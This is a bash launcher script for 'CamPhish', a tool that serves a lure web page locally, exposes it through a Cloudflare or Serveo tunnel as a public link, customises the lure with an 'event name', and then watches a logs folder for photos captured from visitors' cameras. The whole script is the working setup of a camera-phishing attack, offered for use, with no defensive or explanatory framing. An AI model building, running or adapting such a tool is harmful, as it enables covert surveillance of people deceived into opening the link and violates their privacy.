#!/bin/bash

# New color scheme
purple='\e[35m'
orange='\e[33m'
blue='\e[34m'
white='\e[97m'
reset='\e[0m'

# CamPhish ASCII Banner
clear
echo -e "${purple}========================================${reset}"
echo -e "${white}  ______      ______      __      ${reset}"
echo -e "${white} /      \    /      \    /  \     ${reset}"
echo -e "${white}|  CamPhish |  CamPhish |  CamPhish ${reset}"
echo -e "${white} ______/     ______/     __/      ${reset}"
echo -e "${purple}========================================${reset}"
echo -e "${blue}      Photo Capture Tool      ${reset}"
echo -e "${purple}========================================${reset}"
echo ""

# Install dependencies
echo -e "${orange}=== Installing Dependencies ===${reset}"
dependencies=("php" "openssh" "wget" "inotify-tools")
for dep in "${dependencies[@]}"; do
    if ! command -v $dep >/dev/null 2>&1; then
        echo -e "${blue}Installing $dep...${reset}"
        pkg install $dep -y >/dev/null 2>&1
    fi
done

# Install cloudflared
if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${blue}Installing cloudflared...${reset}"
    pkg install cloudflared -y >/dev/null 2>&1
fi

# Redesigned tunnel selection menu
echo -e "${orange}--- Select a Tunneling Method ---${reset}"
echo -e "${blue}[1] Local Server (127.0.0.1:8080)${reset}"
echo -e "${blue}[2] Cloudflare Tunnel (Public URL)${reset}"
echo -e "${blue}[3] Serveo SSH Tunnel (Public URL)${reset}"
echo -ne "${orange}Your selection (1-3) [default: 1]: ${reset}"
read choice
choice=${choice:-1}

# Event name input
echo -ne "${orange}\nEnter Event Name: ${reset}"
read event
event_slug=$(echo "$event" | tr '[:upper:]' '[:lower:]' | tr ' ' '-')

# Update event name in index.html
sed -i "s|Capture a moment with this app!|Capture a moment with this app - $event!|g" index.html

# Start PHP server
echo -e "${orange}\n=== Launching PHP Server on Port 8080 ===${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 3

# Tunnel configuration
public_link=""
if [[ $choice == 2 ]]; then
    echo -e "${orange}=== Initiating Cloudflare Tunnel ===${reset}"
    killall cloudflared >/dev/null 2>&1
    rm -f .cflog
    cloudflared tunnel --url http://localhost:8080 > .cflog 2>&1 &
    sleep 5

    echo -e "${orange}=== Retrieving Cloudflare URL ===${reset}"
    for i in {1..15}; do
        public_link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .cflog | head -n1)
        if [[ $public_link != "" ]]; then
            break
        fi
        sleep 1
    done

elif [[ $choice == 3 ]]; then
    echo -e "${orange}=== Initiating Serveo SSH Tunnel ===${reset}"
    killall ssh >/dev/null 2>&1
    rm -f .srvlog
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .srvlog 2>&1 &
    sleep 7

    echo -e "${orange}=== Retrieving Serveo URL ===${reset}"
    for i in {1..15}; do
        public_link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .srvlog | head -n1)
        if [[ $public_link != "" ]]; then
            break
        fi
        sleep 1
    done

    if [[ $public_link == "" ]]; then
        echo -e "${purple}!!! Serveo tunnel setup failed. Please try again later. !!!${reset}"
        exit 1
    fi
else
    public_link="http://localhost:8080"
fi

# Display the link
echo -e "\n${blue}=== Public Link ===${reset}"
echo -e "${white}$public_link${reset}"

# Monitor for captured images
echo -e "${orange}\n=== Monitoring for Captured Images ===${reset}"
mkdir -p logs
previous_file=""
while true; do
    new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null)
    if [[ "$new_file" != "$previous_file" ]]; then
        echo -e "${blue}>>> Image Captured: logs/$new_file${reset}"
        previous_file="$new_file"
    fi
done